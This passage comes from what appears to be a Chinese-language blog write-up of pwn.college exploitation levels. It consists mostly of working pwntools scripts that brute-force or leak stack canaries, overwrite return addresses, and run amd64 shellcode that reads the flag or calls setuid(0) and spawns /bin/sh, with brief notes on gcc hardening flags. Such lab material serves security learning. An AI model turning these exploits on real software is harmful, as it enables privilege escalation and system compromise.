payload)<br>    r.recvuntil(<span class="hljs-string">&quot;You said: &quot;</span>)<br>    text_of_canary = r.recvuntil(<span class="hljs-string">&quot;Backdoor&quot;</span>)<br>    canary = <span class="hljs-string">b&#x27;\x00&#x27;</span> + text_of_canary[interval:interval+<span class="hljs-number">7</span>]<br>    log.info(<span class="hljs-built_in">list</span>(canary))<br>    <span class="hljs-comment"># 进入Backdoor后，即第二次</span><br>    interval = <span class="hljs-number">0x1A0</span> + <span class="hljs-number">8</span> + <span class="hljs-number">2</span><span class="hljs-comment"># 正常的覆盖返回地址</span><br>    r.sendlineafter(<span class="hljs-string">&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval)) <br>    payload = payload = <span class="hljs-string">b&#x27;A&#x27;</span> * (interval - <span class="hljs-number">18</span>) + canary +  <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x8</span> + p8(<span class="hljs-number">0x3A</span>) + p8(<span class="hljs-number">0x17</span>)<br>    r.sendafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br>    <span class="hljs-comment"># r.interactive()</span><br>    text = r.recvall().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> text:<br>        log.success(text[text.find(<span class="hljs-string">&quot;pwn.college&#123;&quot;</span>):-<span class="hljs-number">1</span>])<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h2 id="level-15"><a class="markdownIt-Anchor" href="#level-15"></a> level 15</h2><blockquote><p>这里就是爆破canary，首先注意远程使用r.clean(0.1)，r.recvall()会获取全部输出，将阻塞线程，其次注意增加terminal的显示大小，否则看不到flag了</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> random<br><br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br><br>offset_to_canary = <span class="hljs-number">0x60</span> - <span class="hljs-number">8</span>  <span class="hljs-comment"># 删除canary的大小</span><br>canary = <span class="hljs-string">b&#x27;\x00&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">leak_canary</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">global</span> canary<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">255</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<span class="hljs-comment"># 从后往前爆破速度快一些</span><br>        r = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">1337</span>)<br>        r.sendlineafter(<span class="hljs-string">&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(offset_to_canary + <span class="hljs-number">1</span> + index))<span class="hljs-comment"># 确定canary最后一位为&#x27;\x00&#x27;了，所以 +1 跳过这一个</span><br>        payload = <span class="hljs-string">b&#x27;A&#x27;</span> * offset_to_canary + canary + p8(j)<br>        r.sendlineafter(<span class="hljs-string">&quot;bytes)!&quot;</span>, payload)<br>        res = r.clean(<span class="hljs-number">0.1</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;smashing&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res:<span class="hljs-comment"># canary不对会返回 stack smashing detected ，利用这个来判断是否爆破成功</span><br>            canary += p8(j)<br>            log.success(<span class="hljs-string">f&quot;The jth position of canary is <span class="hljs-subst">&#123;j&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>):<span class="hljs-comment"># 7个数据</span><br>        leak_canary(i)<br>    log.success(<span class="hljs-string">f&quot;The canary is <span class="hljs-subst">&#123;<span class="hljs-built_in">list</span>(canary)&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<span class="hljs-comment"># 本地启动的进程，数据已经确定，所以最后一个字节需要爆破自己的，而不是爆破程序</span><br>        r = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">1337</span>)<br>        r.sendlineafter(<span class="hljs-string">&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(offset_to_canary + <span class="hljs-number">8</span> + <span class="hljs-number">8</span> + <span class="hljs-number">2</span>))<br>        payload = <span class="hljs-string">b&#x27;A&#x27;</span> * offset_to_canary + canary + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">8</span> + p16(i &lt;&lt; <span class="hljs-number">12</span> | <span class="hljs-number">0xA28</span>)<br>        r.sendafter(<span class="hljs-string">&quot;bytes)!&quot;</span>, payload)<br>        res = r.clean(<span class="hljs-number">0.1</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;flag&quot;</span> <span class="hljs-keyword">in</span> res:<br>            log.success(res)<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exploit()<br></code></pre></td></tr></table></figure><h1 id="program-exploitation"><a class="markdownIt-Anchor" href="#program-exploitation"></a> Program Exploitation</h1><h2 id="基础知识-4"><a class="markdownIt-Anchor" href="#基础知识-4"></a> 基础知识</h2><h3 id="gcc的编译选项"><a class="markdownIt-Anchor" href="#gcc的编译选项"></a> gcc的编译选项</h3><ul><li><p>NX：<code>-z execstack</code> / <code>-z noexecstack</code> (关闭/开启)  不让执行栈上的数据，于是JMP ESP就不能用了</p></li><li><p>Canary：<code>-fno-stack-protector</code> / <code>-fstack-protector</code> / <code>-fstack-protector-all</code> (关闭/开启/全开启) 栈里插入cookie信息</p></li><li><p>PIE：<code>-no-pie</code> / <code>-pie</code> (关闭/开启)  地址随机化，另外打开后会有<em>get_pc_thunk</em></p></li><li><p>RELRO：<code>-z norelro</code> / <code>-z lazy</code> / <code>-z now</code> (关闭/部分开启/完全开启) 对GOT表具有写权限</p></li><li><p><a href="https://blog.csdn.net/tabactivity/article/details/126660974">具体说明</a></p></li></ul><h2 id="level-1-3"><a class="markdownIt-Anchor" href="#level-1-3"></a> level 1</h2><blockquote><p>把之前shellcode和memory等结合在了一起</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> random<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/toddlerone_level[0-9].[0-9]&quot;</span>)<br>r = process(binary_paths)<br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    mov rbx, 0x00000067616c662f</span><br><span class="hljs-string">    push rbx</span><br><span class="hljs-string">    mov rdi,rsp</span><br><span class="hljs-string">    mov rsi,0</span><br><span class="hljs-string">    mov rax,2</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rdi,1</span><br><span class="hljs-string">    mov rsi,rax</span><br><span class="hljs-string">    mov rdx,0</span><br><span class="hljs-string">    mov r10,1000</span><br><span class="hljs-string">    mov rax,40</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    mov rax,60</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>payload_of_shell = asm(shellcode,arch=<span class="hljs-string">&quot;amd64&quot;</span>)<br>r.send(payload_of_shell)<br>interval = <span class="hljs-number">0x60</span><br>r.sendlineafter(<span class="hljs-string">&quot;Payload size: &quot;</span>,<span class="hljs-built_in">str</span>(interval+<span class="hljs-number">0x10</span>))<br>ret = <span class="hljs-number">0x16af0000</span><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*(interval + <span class="hljs-number">8</span>) + p64(ret)<br>r.sendlineafter(<span class="hljs-string">&quot;bytes)!&quot;</span>,payload)<br>text = r.recvall().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;pwn&quot;</span> <span class="hljs-keyword">in</span> text:<br>    log.success(text[text.find(<span class="hljs-string">&quot;pwn.college&#123;&quot;</span>):-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><h2 id="level-2-3"><a class="markdownIt-Anchor" href="#level-2-3"></a> level 2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> random<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/toddlerone_level[0-9].[0-9]&quot;</span>)<br>r = process(binary_paths)<br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    mov rbx, 0x00000067616c662f</span><br><span class="hljs-string">    push rbx</span><br><span class="hljs-string">    mov rdi,rsp</span><br><span class="hljs-string">    mov rsi,0</span><br><span class="hljs-string">    mov rax,2</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rdi,1</span><br><span class="hljs-string">    mov rsi,rax</span><br><span class="hljs-string">    mov rdx,0</span><br><span class="hljs-string">    mov r10,1000</span><br><span class="hljs-string">    mov rax,40</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    mov rax,60</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>interval = <span class="hljs-number">0x70</span><br>payload = asm(shellcode,arch=<span class="hljs-string">&quot;amd64&quot;</span>).ljust((interval+<span class="hljs-number">8</span>),<span class="hljs-string">b&#x27;a&#x27;</span>)<span class="hljs-comment">#ljust自动在后面填充到指定长度</span><br>r.sendlineafter(<span class="hljs-string">&quot;Payload size: &quot;</span>,<span class="hljs-built_in">str</span>(interval+<span class="hljs-number">0x10</span>))<br>ret = <span class="hljs-number">0x00007fffffffd260</span><span class="hljs-comment">#返回到一开始input的地方</span><br>payload += p64(ret)<br>r.sendlineafter(<span class="hljs-string">&quot;bytes)!&quot;</span>,payload)<br>text = r.recvall().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;pwn&quot;</span> <span class="hljs-keyword">in</span> text:<br>    log.success(text[text.find(<span class="hljs-string">&quot;pwn.college&#123;&quot;</span>):-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><p>​level2.1有点奇怪，我是用上面那个shellcode不能成功，能执行不能打印，真是奇了怪了，然后换成下面的这个，在bash中也不能打印，只有在tmux中才可以使用 <code>cat flag</code> 打印出flag出来，我真是无语了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> random<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-F&#x27;</span> <span class="hljs-string">&#x27;#&#123;pane_pid&#125;&#x27;</span>, <span class="hljs-string">&#x27;-P&#x27;</span>]<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/toddlerone_level[0-9].[0-9]&quot;</span>)<br><span class="hljs-comment"># r = gdb.debug(binary_paths,&quot;break *0x401C0B&quot;)</span><br>r = process(binary_paths)<br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    mov rax, 0x69           # setuid,设置特权,单纯使用shell不能提权</span><br><span class="hljs-string">    mov rdi, 0</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rax, 59             # execve</span><br><span class="hljs-string">    lea rdi, [rip+binsh]</span><br><span class="hljs-string">    mov rsi, 0</span><br><span class="hljs-string">    mov rdx, 0</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">binsh:</span><br><span class="hljs-string">    .string &quot;/bin/sh&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>interval = <span class="hljs-number">0x90</span><br>payload = asm(shellcode,arch=<span class="hljs-string">&quot;amd64&quot;</span>).ljust((interval + <span class="hljs-number">0x8</span>),<span class="hljs-string">b&#x27;a&#x27;</span>)<span class="hljs-comment">#覆盖了rbp</span><br>r.sendlineafter(<span class="hljs-string">&quot;Payload size: &quot;</span>,<span class="hljs-built_in">str</span>(interval + <span class="hljs-number">0x10</span>))<span class="hljs-comment">#覆盖ret</span><br>ret = <span class="hljs-number">0x7fffffffd280</span> - interval<br>payload += p64(ret)<br><span class="hljs-built_in">print</span>(payload)<br>r.sendlineafter(<span class="hljs-string">&quot;bytes)!&quot;</span>,payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="level-3-3"><a class="markdownIt-Anchor" href="#level-3-3"></a> level 3</h2><blockquote><p>两次printf泄露canary，主要是对于buf地址的分析</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">第一次的栈</span><br>buf0x00007ffebf117050<br>rsp0x00007ffebf117010<br>rbp0x00007ffebf1170900x00007ffebf1180d0<br><span class="hljs-meta prompt_"># </span><span class="language-bash">第二次的栈</span><br>buf0x00007ffebf116fc0<br>rsp0x00007ffebf116f80<br>rbp0x00007ffebf1170000x00007ffebf117090<br><span class="hljs-meta prompt_"># </span><span class="language-bash">第三次的栈</span><br>buf0x00007ffebf116f30<br>rsp0x00007ffebf116ef0<br>rbp0x00007ffebf116f700x00007ffebf117000<br></code></pre></td></tr></table></figure><p>​这里主要分析三次栈的差别，rsp相差0x90，根据下图栈开辟情况。首先 <code>push rbp</code> 和 <code>push canary</code> 占用了 0x10 字节，然后 <code>add</code> 增加了 0x80 字节，满足 0x90 的数据。然后可以知道后面一次的函数是在前面一次的栈上开辟的，所以每次 <code>rbp </code> 的差值也符合 0x90，同时下一次rbp存储的值刚好就是上一次rbp的地址，因为这是 <code>push</code> 操作的结果，所以可以使用第二次来泄露 rbp 的值，也就泄露出第一次的rbp地址，然后再通过 <code>address_of_rbp - 0x90 * 2</code> 来找到第三次rbp的地址，然后通过偏移 <code>0x40</code> 可以找到第三次buf的地址，从而完成ret的构造。</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202402271836763.png" alt="image-20240227183658636" /></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> struct<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/toddlerone_level[0-9].[0-9]&quot;</span>)<br>r = process(binary_paths)<br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    mov rax, 0x69           # setuid,设置特权,单纯使用shell不能提权</span><br><span class="hljs-string">    mov rdi, 0</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rax, 59             # execve</span><br><span class="hljs-string">    lea rdi, [rip+binsh]</span><br><span class="hljs-string">    mov rsi, 0</span><br><span class="hljs-string">    mov rdx, 0</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">binsh:</span><br><span class="hljs-string">    .string &quot;/bin/sh&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-comment"># 采用这个shellcode是为了让长度小于0x40 - 24</span><br><span class="hljs-comment"># 第一次泄露 canary 的值</span><br>interval = <span class="hljs-number">0x40</span> - <span class="hljs-number">8</span> + <span class="hljs-number">1</span><span class="hljs-comment"># 减去canary的长度，然后需要覆盖最后一个&#x27;\x00&#x27;而+1，溢出到canary之前的位置</span><br>r = process(binary_paths)<br>r.sendlineafter(<span class="hljs-string">&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval))<br>payload = <span class="hljs-string">b&#x27;REPEAT&#x27;</span> + <span class="hljs-string">b&#x27;A&#x27;</span>* (interval - <span class="hljs-number">6</span>)  <span class="hljs-comment"># 满足buffer的要求</span><br>r.sendafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br>r.recvuntil(<span class="hljs-string">&quot;You said: &quot;</span>)<br>text_of_canary = r.recvuntil(<span class="hljs-string">&quot;Backdoor&quot;</span>)<br>canary = <span class="hljs-string">b&#x27;\x00&#x27;</span> + text_of_canary[interval:interval+<span class="hljs-number">7</span>]<span class="hljs-comment"># 获得canary的值</span><br>hex_canary = [<span class="hljs-built_in">hex</span>(byte) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytearray</span>(canary)]<br>log.info(<span class="hljs-string">f&quot;canary : <span class="hljs-subst">&#123;<span class="hljs-built_in">list</span>(hex_canary)&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># 第二次泄露 第一次 rbp 的地址，从而构造 ret</span><br>interval += <span class="hljs-number">7</span><span class="hljs-comment"># 补上canary，溢出到rbp之前的位置</span><br>r.sendlineafter(<span class="hljs-string">&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval))<br>payload = <span class="hljs-string">b&#x27;REPEAT&#x27;</span> + <span class="hljs-string">b&#x27;B&#x27;</span>* (interval - <span class="hljs-number">6</span>)   <span class="hljs-comment"># 这里直接把canary也覆盖了，因为不覆盖会有&#x27;\x00&#x27;截断</span><br>r.sendafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br>r.recvuntil(<span class="hljs-string">&quot;You said: &quot;</span>)<br>text_of_rbp = r.recvuntil(<span class="hljs-string">&quot;Backdoor&quot;</span>)<br>rbp_byte = text_of_rbp[interval:interval+<span class="hljs-number">6</span>]<span class="hljs-comment"># 获得rbp的值</span><br>hex_rbp = [<span class="hljs-built_in">hex</span>(byte) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytearray</span>(rbp_byte)]<br>log.info(<span class="hljs-string">f&quot;address of rbp : <span class="hljs-subst">&#123;<span class="hljs-built_in">list</span>(hex_rbp)&#125;</span>&quot;</span>)<br>rbp_int = struct.unpack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, (rbp_byte + <span class="hljs-string">b&#x27;\x00\x00&#x27;</span>))[<span class="hljs-number">0</span>]<br>rbp_int -= (<span class="hljs-number">0x90</span> * <span class="hljs-number">2</span> + interval)<span class="hljs-comment"># 修正 ret</span><br>ret = struct.pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, rbp_int)<br><br><span class="hljs-comment"># 第三次执行 shellcode</span><br>shell_code = asm(shellcode,arch=<span class="hljs-string">&quot;amd64&quot;</span>)<br>hex_shell_code = [<span class="hljs-built_in">hex</span>(byte) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytearray</span>(shell_code)]<br>log.info(<span class="hljs-string">f&quot;shellcode : <span class="hljs-subst">&#123;hex_shell_code&#125;</span>&quot;</span>)<br>log.info(<span class="hljs-string">f&quot;len of shellcode is: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(shell_code)&#125;</span>&quot;</span>)<br>interval += <span class="hljs-number">16</span><span class="hljs-comment"># 补上rbp和ret，需要溢出到return之后的位置</span><br>r.sendlineafter(<span class="hljs-string">&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval)) <br>payload = shell_code + <span class="hljs-string">b&#x27;B&#x27;</span> * (interval - <span class="hljs-number">24</span> - <span class="hljs-built_in">len</span>(shell_code)) + canary + <span class="hljs-string">b&#x27;C&#x27;</span> * <span class="hljs-number">0x8</span> + ret<br>r.sendafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="level-4-3"><a class="markdownIt-Anchor" href="#level-4-3"></a> level 4</h2><blockquote><p>需要设置内存中一个固定值，找准偏移即可</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> struct<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&quot;info&quot;</span>)<br>binary_paths = glob.glob(<span class="hljs-string">&quot;/challenge/toddlerone_level[0-9].[0-9]&quot;</span>)<br>r = process(binary_paths)<br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    mov rax, 0x69           # setuid,设置特权,单纯使用shell不能提权</span><br><span class="hljs-string">    mov rdi, 0</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rax, 59             # execve</span><br><span class="hljs-string">    lea rdi, [rip+binsh]</span><br><span class="hljs-string">    mov rsi, 0</span><br><span class="hljs-string">    mov rdx, 0</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">binsh:</span><br><span class="hljs-string">    .string &quot;/bin/sh&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-comment"># 采用这个shellcode是为了让长度小于0x40 - 24</span><br><span class="hljs-comment"># 第一次泄露 canary 的值</span><br>interval = <span class="hljs-number">0x60</span> - <span class="hljs-number">8</span> + <span class="hljs-number">1</span><span class="hljs-comment"># 减去canary的长度，然后需要覆盖最后一个&#x27;\x00&#x27;而+1，溢出到canary之前的位置</span><br>r = process(binary_paths)<br>r.sendlineafter(<span class="hljs-string">&quot;Payload size:&quot;</span>, <span class="hljs-built_in">str</span>(interval))<br>payload = <span class="hljs-string">b&#x27;REPEAT&#x27;</span> + <span class="hljs-string">b&#x27;A&#x27;</span>* (interval - <span class="hljs-number">6</span>)  <span class="hljs-comment"># 满足buffer的要求</span><br>r.sendafter(<span class="hljs-string">&quot;bytes)!\n&quot;</span>, payload)<br>r.recvuntil(<span class="hljs-string">&quot;You said: &quot;</span>)<br>text_of_canary = r.recvuntil(<span class="hljs-string">&quot;Backdoor&quot;</span>)<br>canary = <span class="hljs-string">b&#x27;\x00&#x27;</span> + text_of_canary[interval:interval+<span class="hljs-number">7</span>]<span class="hljs-comment"># 获得canary的值</span><br>hex_canary = [<span class="hljs-built_in">hex</span>(byte) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytearray</span>(canary)]<br>log.info(<span 